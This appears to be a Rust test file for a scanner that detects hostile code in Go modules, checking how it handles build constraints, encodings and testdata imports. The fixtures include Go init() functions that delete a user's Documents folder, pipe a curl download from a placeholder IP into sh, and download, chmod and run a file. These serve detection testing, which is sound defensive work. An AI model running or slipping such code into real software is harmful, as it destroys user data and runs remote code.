        "// +build ignore\u{a0}linux\n\n",
        "// +build ignore,linux\u{a0}darwin\n\n",
        "//go:build ignore && caf\u{e9}\n\n",
    ]);
    // the same outside a comment, and a NUL (Go's error): not left out (the parser refuses them: the text rules read
    // them)
    // (a line Go trims to a second //go:build line is its error, "multiple //go:build comments"; after a block
    // comment's end, a character outside ASCII may be white space to Go)
    for h in ["\u{a0}//go:build ignore\n\n", "\u{feff}\u{feff}//go:build ignore\n\n", "//go:build ignore\n// \u{0}\n\n",
              "/* c */ \u{a0}\n//go:build ignore\n\n", "//go:build ignore\n\u{a0}//go:build x\n\n",
              "//go:build ignore\n\u{85}//go:build x\n\n", "//go:build ignore\n/* c */\u{a0}//go:build x\n\n"] {
        assert!(!build_ignored(&u32s(&format!("{h}{F06_PAYLOAD}"))), "{h:?}");
        assert_ne!(f06(h), F06::LeftOut, "{h:?}");
    }
    // after the package clause, a constraint is a comment
    let a = read(&[("p.go", &F06_PAYLOAD.replacen("package p\n", "package p\n\n//go:build ignore\n", 1))], Options::default());
    assert_eq!(a.read, vec![0]);
    assert!(has(&start(&a), "deletes the user's files"), "{:?}", a);
}

#[test]
fn a_long_header_is_read_whole() {
    // the old reading looked at the first 65,536 characters: there `//go:build ignore || linux` was `//go:build ignore`
    let pad = 65_536 - "//go:build ignore".len() - 3;
    assert_read(&[&format!("//{}\n//go:build ignore || linux\n\n", "x".repeat(pad))]);
    assert_left_out(&[&format!("//{}\n//go:build ignore\n\n", "x".repeat(pad * 4))]);
    // a constraint term count past MAX_CONSTRAINT_TERMS is not read
    let many = vec!["linux"; super::MAX_CONSTRAINT_TERMS].join(" && ");
    assert_read(&[&format!("//go:build ignore && {many}\n\n")]);
    assert_left_out(&[&format!("//go:build ignore && {}\n\n", vec!["linux"; super::MAX_CONSTRAINT_TERMS - 1].join(" && "))]);
}

/// F-06's payload in UTF-16 (`le`: little-endian), with a byte order mark or none.
fn utf16(text: &str, le: bool, bom: bool) -> Vec<u8> {
    let mut out = Vec::new();
    for unit in std::iter::once(0xFEFFu16).filter(|_| bom).chain(text.encode_utf16()) {
        out.extend_from_slice(&if le { unit.to_le_bytes() } else { unit.to_be_bytes() });
    }
    out
}

#[test]
fn the_file_is_read_as_the_go_toolchain_reads_its_bytes() {
    // F-06's review: decided on the decoded text, a lone "\r" (no line end to Go) had become one, a second byte order
    // mark had been dropped by the reader after the decoding dropped the first, and UTF-16 had become clean text
    let p = F06_PAYLOAD.as_bytes();
    let cat = |h: &[u8]| [h, p].concat();
    for data in [cat(b"// c\r//go:build ignore\n\n"), cat(b"// c\r// +build ignore\n\n"), cat(b"//+build ignore\r// +build x\n\n"),
                 cat(b"\xef\xbb\xbf\xef\xbb\xbf//go:build ignore\n\n")] {
        assert_eq!(f06_bytes(&data), F06::Found, "{:?}", String::from_utf8_lossy(&data));
    }
    // Go refuses these (NULs, "parsing //go:build line", "expected 'package'"): not left out, the parser refuses them
    let mut refused: Vec<Vec<u8>> = Vec::new();
    for h in ["//go:build ignore\n\n", "// +build ignore\n\n"] {
        let text = format!("{h}{F06_PAYLOAD}");
        for (le, bom) in [(true, true), (false, true), (true, false), (false, false)] {
            refused.push(utf16(&text, le, bom));
        }
    }
    let nul = b"//go:build ignore\n\npackage n1\n// \x00\n\nimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n";
    assert_ne!(f06_bytes(nul), F06::LeftOut);
    // a NUL past the package clause and the imports, which Go's reader stops before: Go leaves the file out with no
    // error (the review's nulbody), and so does this; inside an import, or a header comment, Go's error: read
    let tail = b"//go:build ignore\n\npackage p\n\nimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n// \x00\n";
    assert_eq!(f06_bytes(tail), F06::LeftOut);
    assert_eq!(f06_bytes(b"//go:build ignore\n\npackage p\n\nimport (\n\t\"os\"\n)\n\nvar s = \"\x00\"\n"), F06::LeftOut);
    // (Go's reader: a name holds characters outside ASCII, a `;` is skipped as white space, a string's `\"` is no end)
    for data in [&b"//go:build ignore\n\npackage p\xc3\xa9\n\nimport \"o\x00s\"\n"[..], b"//go:build ignore\n\npackage p; import \"o\x00s\"\n",
                 b"//go:build ignore\n\npackage p\n\nimport \"a\\\"z\x00\"\n", b"//go:build ignore\n\npackage p\n\nimport (\n\t\"a\";\"b\x00\"\n)\n",
                 b"//go:build ignore\n\npackage p\n\nimport \xc3\xa9 \"o\x00s\"\n"] {
        assert!(!build_ignored(&crate::decode::go_source(data)), "{:?}", String::from_utf8_lossy(data));
    }
    for data in [&b"//go:build ignore\n\npackage p\n\nimport \"o\x00s\"\n"[..], b"//go:build ignore\n\npackage p\n\nimport /* \x00 */ \"os\"\n",
                 b"//go:build ignore\n\npackage p\n\nimport (\n\t\"os\"\n\t// \x00\n)\n", b"//go:build ignore\n\npackage p\nimport \"os\" \x00\n",
                 b"//go:build ignore\n\npackage \x00p\n", b"//go:build ignore\n\npackage p\n\nimport \"os\n\x00\n"] {
        assert!(!build_ignored(&crate::decode::go_source(data)), "{:?}", String::from_utf8_lossy(data));
    }
    refused.push(b"//go:build ignore\r\rpackage p\r\rimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n".to_vec());
    refused.push(b"\t\n// +build ignore,x\n".to_vec());
    for data in &refused {
        assert_eq!(f06_bytes(data), F06::Unparsed, "{:?}", String::from_utf8_lossy(&data[..data.len().min(40)]));
    }
    // the quiet controls stay quiet through the decoding: CRLF, and one byte order mark
    for data in [cat(b"//go:build ignore\r\n\r\n"), cat(b"\xef\xbb\xbf//go:build ignore\n\n"), cat(b"// +build ignore\r\n\r\n")] {
        assert_eq!(f06_bytes(&data), F06::LeftOut, "{:?}", String::from_utf8_lossy(&data));
    }
}

#[test]
fn a_carriage_return_in_a_string_is_gos() {
    // Go compiles a "\r" inside a string; the decoding made it a line end, and the parser refused the file
    let src = b"package crs\n\nimport \"os\"\n\nvar s = \"a\rb\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n";
    assert_eq!(f06_bytes(src), F06::Found);
}

#[test]
fn a_file_the_parser_refuses_makes_the_module_incomplete() {
    // a build may compile what this parser refuses: the reader's issues say the code was not read (SC-TRUNCATED)
    use crate::json::Value;
    let files = [("m.go", "package m\n\nfunc F() int { return 1 }\n"), ("bad.go", "package m\n\nfunc (\n"), ("worse.go", "package\n")];
    let text: Vec<u32> = files.iter().flat_map(|(_, t)| u32s(t)).collect();
    let list = Value::Arr(files.iter().map(|(p, t)| Value::Arr(vec![Value::Str(u32s(p)), Value::Int(t.chars().count() as i64)])).collect());
    let names = Value::Arr(files.iter().map(|(p, _)| Value::Str(u32s(&format!("m@v1/{p}")))).collect());
    let args = Value::obj(vec![("files", list), ("what", Value::Str(u32s("module"))), ("names", names)]);
    let answer = crate::json::write(&crate::api::call("go_package", &args, &text).expect("an answer"));
    assert!(answer.contains("\"unparsed\":[1,2]"), "{answer}");
    assert!(answer.contains("SC-TRUNCATED") && answer.contains("the engine's Go parser refused m@v1/bad.go at line 4 (") && answer.contains(") and 1 more .go file, so what their code does"), "{answer}");
    let a = read(&[("m.go", files[0].1), ("bad.go", files[1].1)], Options::default());
    assert_eq!((a.unparsed.clone(), a.refused.len(), a.refused[0].1), (vec![1], 1, 4), "{:?}", a);
}

#[test]
fn a_testdata_package_an_import_names_is_read() {
    // F-06's review: a package in testdata/ that the module's code imports is built (go list -deps, go mod vendor)
    let lib = |imp: &str| format!("package m\n\nimport _ \"{imp}\"\n\nfunc F() int {{ return 1 }}\n");
    let td = F06_PAYLOAD.replace("package p", "package td");
    let module = Some(u32s("example.test/m"));
    let m = |module: &Option<PyStr>| Options { module: module.clone(), ..Options::default() };
    for opts in [m(&module), m(&None)] {
        let a = read(&[("m.go", &lib("example.test/m/testdata/td")), ("testdata/td/td.go", &td), ("testdata/other/o.go", &td)], opts.clone());
        assert_eq!(a.read, vec![0, 1], "{:?}", opts.module);
        assert!(has(&start(&a), "deletes the user's files"), "{a:?}");
    }
    // not imported: not read; another module's testdata: not read
    for imp in ["strings", "example.test/other/testdata/td"] {
        let a = read(&[("m.go", &lib(imp)), ("testdata/td/td.go", &td)], m(&module));
        assert_eq!(a.read, vec![0], "{imp}");
    }
    // a testdata package imported by one that is read, and the package `testdata` itself
    let chain = "package a\n\nimport _ \"example.test/m/testdata/b\"\n";
    let a = read(&[("m.go", &lib("example.test/m/testdata/a")), ("testdata/a/a.go", chain), ("testdata/b/b.go", &td)], m(&module));
    assert_eq!(a.read, vec![0, 1, 2]);
    let a = read(&[("m.go", &lib("example.test/m/testdata")), ("testdata/t.go", &td)], m(&module));
    assert_eq!(a.read, vec![0, 1]);
    // a file the parser refused (the module is INCOMPLETE for it) reads no testdata package (F-06's third round)
    let a = read(&[("m.go", "package m\n\nfunc (\n"), ("testdata/td/td.go", &td)], m(&module));
    assert_eq!((a.read.clone(), a.unparsed.clone(), a.refused.len()), (vec![], vec![0], 1));
    // a chain whose second link comes first: read in a second pass
    let a = read(&[("m.go", &lib("example.test/m/testdata/z")), ("testdata/a/a.go", &td),
                   ("testdata/z/z.go", "package z\n\nimport _ \"example.test/m/testdata/a\"\n")], m(&module));
    assert_eq!(a.read, vec![0, 1, 2]);
    assert!(has(&start(&a), "deletes the user's files"), "{a:?}");
    // a testdata/ folder below another folder: read when imported, only then
    for (imp, read_) in [("example.test/m/sub/testdata/x", vec![0, 1]), ("example.test/m/sub", vec![0])] {
        let a = read(&[("m.go", &lib(imp)), ("sub/testdata/x/x.go", &td), ("sub/s.go", "package sub\n")], m(&module));
        assert_eq!(a.read.iter().filter(|&&k| k < 2).copied().collect::<Vec<_>>(), read_, "{imp}");
    }
    // an import that names another of the module's folders, or one of another module's, reads no testdata package
    for (imp, opts) in [("example.test/m/sub", m(&module)), ("example.test/m/testdata/tdx", m(&module)),
                        ("example.test/mm/testdata/td", m(&module)), ("example.test/m/xtestdata/td", m(&module)),
                        ("example.test/m/sub/testdata/td", m(&module)), ("example.test/m/xtestdata/td", m(&None)),
                        ("xtestdata/td", m(&None)), ("example.test/m/testdata/td/sub", m(&None))] {
        let a = read(&[("m.go", &lib(imp)), ("testdata/td/td.go", &td), ("sub/s.go", "package sub\n")], opts);
        assert!(!a.read.contains(&1), "{imp}: {a:?}");
    }
    // a testdata package's cgo C is read with its Go only
    let cgo = "package td\n\n// #include \"c.h\"\nimport \"C\"\n";
    for (imp, read_) in [("strings", vec![0]), ("example.test/m/testdata/td", vec![0, 1, 2])] {
        let a = read(&[("m.go", &lib(imp)), ("testdata/td/td.go", cgo), ("testdata/td/c.h", "static int x;\n")], m(&module));
        assert_eq!(a.read, read_, "{imp}");
    }
    // a test file's import builds nothing for a dependent
    let a = read(&[("m.go", "package m\n"), ("m_test.go", &lib("example.test/m/testdata/td")), ("testdata/td/td.go", &td)], m(&module));
    assert_eq!(a.read, vec![0]);
}

#[test]
fn a_test_file_ends_in_test_go_exactly() {
    // Go's test files end in `_test.go` exactly: `x_TEST.go` is built, and read
    assert!(super::never_built(&u32s("x_test.go")) && !super::never_built(&u32s("x_TEST.go")) && !super::never_built(&u32s("a/x_Test.go")));
    let a = read(&[("m_TEST.go", F06_PAYLOAD)], Options::default());
    assert_eq!(a.read, vec![0]);
}

#[test]
fn a_package_in_vendor_itself_is_the_modules() {
    // `m/vendor` is importable and built; `m/vendor/x` must be imported as `x`, another module's
    let td = F06_PAYLOAD.replace("package p", "package vendor");
    let opts = Options { module: Some(u32s("example.test/vd")), ..Options::default() };
    let a = read(&[("a.go", "package vd\n\nimport _ \"example.test/vd/vendor\"\n"), ("vendor/v.go", &td), ("vendor/x/x.go", &td),
                   ("sub/vendor/v.go", &td)], opts);
    assert_eq!(a.read, vec![0, 1, 3]);
    assert!(has(&start(&a), "deletes the user's files"), "{a:?}");
}

#[test]
fn a_refused_file_go_builds_only_when_imported_holds_the_module_only_then() {
    // F-06's third round: a template in `_examples/`, a fixture in `testdata/`: Go builds neither unless an import
    // names its package, and a file of it the parser refuses does not make the module INCOMPLETE (the review's uscore)
    let module = Some(u32s("example.test/m"));
    let opts = Options { module: module.clone(), ..Options::default() };
    let tmpl = "package {{.Name}}\n\nfunc F() {}\n";
    for dir in ["_examples/tmpl", ".hidden", "a/_b"] {
        let a = read(&[("m.go", "package m\n"), (&format!("{dir}/t.go"), tmpl)], opts.clone());
        assert_eq!((a.unparsed.clone(), a.refused.len()), (vec![1], 0), "{dir}");
        let imp = format!("package m\n\nimport _ \"example.test/m/{dir}\"\n");
        let a = read(&[("m.go", &imp), (&format!("{dir}/t.go"), tmpl)], opts.clone());
        assert_eq!((a.unparsed.clone(), a.refused.len()), (vec![1], 1), "{dir}");
    }
    // a folder of any other name is built (`go build ./...`)
    let a = read(&[("m.go", "package m\n"), ("tools/gen/bad.go", "package gen\n\nfunc F( {\n")], opts.clone());
    assert_eq!(a.refused.len(), 1);
    // a vendor tree's modules.txt lists what a build compiles: each refused file holds the module, and every
    // testdata package given is read
    let listed = Options { module: module.clone(), listed: true, ..Options::default() };
    let td = F06_PAYLOAD.replace("package p", "package td");
    let a = read(&[("m.go", "package m\n\nimport _ \"example.test/ta/testdata/x\"\n"), ("_x/t.go", tmpl), ("testdata/td/td.go", &td)], listed);
    assert_eq!((a.read.clone(), a.refused.len()), (vec![0, 2], 1));
    assert!(has(&start(&a), "deletes the user's files"), "{a:?}");
    // (another vendored module's testdata package is read with that module: no finding here)
    assert!(a.wanted.is_empty() && a.testdata_imports.is_empty(), "{a:?}");
}

#[test]
fn a_testdata_import_not_given_is_wanted_or_another_modules() {
    // the registry gives a module's testdata .go files only when asked (`wanted`); an import of another module's
    // testdata package is SC-GO-TESTDATA-IMPORT (the review's example.test/ta and tb)
    let lib = |imp: &str| format!("package m\n\nimport (\n\t\"strings\"\n\t_ \"{imp}\"\n)\n\nvar _ = strings.ToUpper\n");
    let m = |module: Option<&str>| Options { module: module.map(u32s), ..Options::default() };
    let a = read(&[("m.go", &lib("example.test/m/testdata/td"))], m(Some("example.test/m")));
    assert_eq!((a.wanted.iter().map(|w| st(w)).collect::<Vec<_>>(), a.testdata_imports.len()), (vec!["example.test/m/testdata/td".to_string()], 0));
    for other in ["example.test/ta/testdata/x", "example.test/mm/testdata/x"] {
        let a = read(&[("m.go", &lib(other))], m(Some("example.test/m")));
        assert!(a.wanted.is_empty(), "{a:?}");
        assert_eq!(a.testdata_imports.iter().map(|(k, l, p)| (*k, *l, st(p))).collect::<Vec<_>>(), vec![(0, 5, other.to_string())]);
    }
    // with no module path, any such import may be the module's own
    let a = read(&[("m.go", &lib("example.test/ta/testdata/x"))], m(None));
    assert_eq!((a.wanted.len(), a.testdata_imports.len()), (1, 0));
    // given, it is read: no more wanted; an import with no testdata element is neither
    let td = F06_PAYLOAD.replace("package p", "package td");
    let a = read(&[("m.go", &lib("example.test/m/testdata/td")), ("testdata/td/td.go", &td)], m(Some("example.test/m")));
    assert!(a.wanted.is_empty() && a.read == vec![0, 1], "{a:?}");
    let a = read(&[("m.go", &lib("example.test/ta/testdatax/x"))], m(Some("example.test/m")));
    assert!(a.wanted.is_empty() && a.testdata_imports.is_empty(), "{a:?}");
    // the imports of a test file and of a file left out are not a build's
    let a = read(&[("m.go", "package m\n"), ("m_test.go", &lib("example.test/ta/testdata/x"))], m(Some("example.test/m")));
    assert!(a.testdata_imports.is_empty());
    let ignored = format!("//go:build ignore\n\n{}", lib("example.test/ta/testdata/x"));
    let a = read(&[("m.go", "package m\n"), ("gen.go", &ignored)], m(Some("example.test/m")));
    assert!(a.testdata_imports.is_empty() && a.wanted.is_empty(), "{a:?}");
    // (F-06's fourth round) a nested module's testdata package: its path is the module's, its folder none the module
    // has (a module zip leaves nested modules out): with the module's testdata folders known, another module's
    let with = |dirs: &[&str]| Options { module: Some(u32s("example.test/nst")), testdata_dirs: Some(dirs.iter().map(|d| u32s(d)).collect()), ..Options::default() };
    let nst = "package nst\n\nimport _ \"example.test/nst/inner/testdata/x\"\n";
    let a = read(&[("nst.go", nst)], with(&[]));
    assert_eq!((a.wanted.len(), a.testdata_imports.iter().map(|(k, l, p)| (*k, *l, st(p))).collect::<Vec<_>>()),
               (0, vec![(0, 3, "example.test/nst/inner/testdata/x".to_string())]));
    let a = read(&[("nst.go", nst)], with(&["testdata/y", "inner/testdata/x"]));
    assert_eq!((a.wanted.iter().map(|w| st(w)).collect::<Vec<_>>(), a.testdata_imports.len()), (vec!["example.test/nst/inner/testdata/x".to_string()], 0));
    // (with no module path, an import that ends in none of its folders)
    let none = |dirs: &[&str]| Options { testdata_dirs: Some(dirs.iter().map(|d| u32s(d)).collect()), ..Options::default() };
    assert_eq!(read(&[("nst.go", nst)], none(&["testdata/y"])).testdata_imports.len(), 1);
    assert_eq!(read(&[("nst.go", nst)], none(&["inner/testdata/x"])).wanted.len(), 1);
}

#[test]
fn the_imports_of_a_files_build() {
    // F-06's fourth round: what a --deps scan asks of a vendor tree's Go files (go_imports): the import paths, none
    // for a file a constraint leaves out, None for one the parser refuses
    let imports = |src: &str| file_imports(&u32s(src)).map(|v| v.iter().map(|p| st(p)).collect::<Vec<_>>());
    assert_eq!(imports("package p\n\nimport (\n\t_ \"example.test/evil/_u\"\n\tx \"a/b\"\n)\nimport \"c\"\n"),
               Some(vec!["example.test/evil/_u".to_string(), "a/b".to_string(), "c".to_string()]));
    assert_eq!(imports("package p\n\nimport _ \"example.test/evil/\\x5fu\"\n"), Some(vec!["example.test/evil/_u".to_string()]));
    assert_eq!(imports("//go:build ignore\n\npackage p\n\nimport _ \"x/_u\"\n"), Some(vec![]));
    assert_eq!(imports("package p\n\nfunc (\n"), None);
}

#[test]
fn a_lone_carriage_return_numbers_lines_as_the_text_rules_do() {
    // Go reads a lone "\r" as white space; the text rules end a line there: the reader's lines are theirs (the
    // review's crline and somecr)
    let src = b"package crline\n\n// one\r// two\r// three\n\nimport (\n\t\"os/exec\"\n)\n\nfunc init() {\n\texec.Command(\"/bin/sh\", \"-c\", \"curl -s https://203.0.113.7/a.sh | sh\").Run()\n}\n";
    let a = read_bytes(&[("m.go", src)], Options::default());
    let rules = crate::decode::decode_source(src, Some("go")).0;
    let line = rules.split(|&c| c == '\n' as u32).position(|l| st(l).contains("exec.Command")).unwrap() + 1;
    assert_eq!((a.start.len(), a.start[0].line), (1, line), "{a:?}");
    assert_eq!(line, 12);
    // a finding whose line is the model's facts' (a download written and run): the rules' too, as in the file with
    // "\n" for each lone "\r"
    let dl = "package p\n\n// a\r// b\r// c\n\nimport (\n\t\"io\"\n\t\"net/http\"\n\t\"os\"\n\t\"os/exec\"\n)\n\nfunc init() {\n\
              \tresp, err := http.Get(\"https://example.invalid/p\")\n\tif err != nil {\n\t\treturn\n\t}\n\tdefer resp.Body.Close()\n\
              \tf, _ := os.Create(\"/tmp/p\")\n\tio.Copy(f, resp.Body)\n\tf.Close()\n\tos.Chmod(\"/tmp/p\", 0755)\n\
              \texec.Command(\"/tmp/p\").Start()\n}\n";
    let lines = |src: &str| read_bytes(&[("m.go", src.as_bytes())], Options::default()).start.iter().map(|f| (f.line, reasons(&[f.clone()]))).collect::<Vec<_>>();
    let (cr, lf) = (lines(dl), lines(&dl.replace('\r', "\n")));
    assert!(!cr.is_empty() && cr[0].1.iter().any(|r| r.contains("downloads a file and then runs it")), "{cr:?}");
    assert_eq!(cr.iter().map(|x| x.0).collect::<Vec<_>>(), lf.iter().map(|x| x.0).collect::<Vec<_>>());
    // a finding whose line is the model's (a deletion): the rules' too
    let a = read_bytes(&[("m.go", b"package p\n\n// a\r// b\r// c\n\nimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n")], Options::default());
    assert_eq!(a.start.iter().map(|f| f.line).collect::<Vec<_>>(), vec![9], "{a:?}");
    // a //go:generate line after lone "\r"s, and a refusal's line (Go's lines 2 and 3)
    let a = read_bytes(&[("p.go", b"package p\r\r// a\n//go:generate echo hi\n")], Options::default());
    assert_eq!(a.generate.iter().map(|g| g.1).collect::<Vec<_>>(), vec![4], "{a:?}");
    let a = read_bytes(&[("p.go", b"package p\r\r// a\n//go:generate echo hi\nfunc ( {\n")], Options::default());
    assert_eq!(a.refused.iter().map(|r| r.1).collect::<Vec<_>>(), vec![5], "{a:?}");
}

/// go_package's answer, with the reader's issues, for `files` (paths below the module's root, as the issues name them).
fn go_package_answer(files: &[(&str, &str)], extra: Vec<(&str, crate::json::Value)>) -> String {
    use crate::json::Value;
    let text: Vec<u32> = files.iter().flat_map(|(_, t)| u32s(t)).collect();
    let list = Value::Arr(files.iter().map(|(p, t)| Value::Arr(vec![Value::Str(u32s(p)), Value::Int(t.chars().count() as i64)])).collect());
    let names = Value::Arr(files.iter().map(|(p, _)| Value::Str(u32s(p))).collect());
    let mut args = vec![("files", list), ("what", Value::Str(u32s("module"))), ("names", names)];
    args.extend(extra);
    crate::json::write(&crate::api::call("go_package", &Value::obj(args), &text).expect("an answer"))
}

#[test]
fn the_readers_issues_of_a_testdata_import_and_a_file_not_text() {
    use crate::json::Value;
    let module = || vec![("module", Value::Str(u32s("example.test/tb")))];
    let tb = "package tb\n\nimport (\n\t_ \"example.test/ta/testdata/x\"\n\t_ \"example.test/ta/testdata/y\"\n)\n";
    let answer = go_package_answer(&[("tb.go", tb), ("tc.go", "package tb\n\nimport _ \"example.test/ta/testdata/x\"\n")], module());
    assert!(answer.contains("\"testdataImports\":[[0,4,\"example.test/ta/testdata/x\"],[0,5,\"example.test/ta/testdata/y\"],[1,3,\"example.test/ta/testdata/x\"]]"), "{answer}");
    assert_eq!(answer.matches("SC-GO-TESTDATA-IMPORT").count(), 1, "{answer}");
    assert!(answer.contains("tb.go imports example.test/ta/testdata/x (and 1 more such import), a package in another module's testdata/ folder"), "{answer}");
    assert!(answer.contains("MAJOR"), "{answer}");
    // the module's own: wanted, no finding; one in a folder the module does not have (a nested module's): the finding
    let answer = go_package_answer(&[("tb.go", "package tb\n\nimport _ \"example.test/tb/testdata/x\"\n")], module());
    assert!(answer.contains("\"wanted\":[\"example.test/tb/testdata/x\"]") && !answer.contains("SC-GO-TESTDATA-IMPORT"), "{answer}");
    let mut with = module();
    with.push(("testdata", Value::Arr(vec![Value::Str(u32s("testdata/y"))])));
    let answer = go_package_answer(&[("tb.go", "package tb\n\nimport _ \"example.test/tb/inner/testdata/x\"\n")], with);
    assert!(answer.contains("tb.go imports example.test/tb/inner/testdata/x, a package in another module's testdata/") && answer.contains("\"wanted\":[]"), "{answer}");
    // a lone "\r": the issue's line and its snippet are the rules' (the snippet holds the line)
    let cr = "package p\n\n// a\r// b\r// c\n\nimport \"os\"\n\nfunc init() { os.RemoveAll(\"/home/example/Documents\") }\n";
    let answer = go_package_answer(&[("cr.go", cr)], module());
    assert!(answer.contains(r#",9,["import \"os\"","",""#) && answer.contains("func init() { os.RemoveAll"), "{answer}");
    // a refused file whose text is not text has the decoding's SC-TRUNCATED only; one that is text, the reader's
    let junk = format!("package p\n{}\n", "\u{fffd}\u{1}".repeat(200));
    let answer = go_package_answer(&[("ok.go", "package p\n"), ("junk.go", &junk)], module());
    assert!(answer.contains("\"refused\":[[1,") && !answer.contains("SC-TRUNCATED"), "{answer}");
    let answer = go_package_answer(&[("ok.go", "package p\n"), ("junk.go", &junk), ("bad.go", "package p\n\nfunc (\n")], module());
    assert!(answer.contains("the engine's Go parser refused bad.go at line 4 (") && !answer.contains("and 1 more"), "{answer}");
}
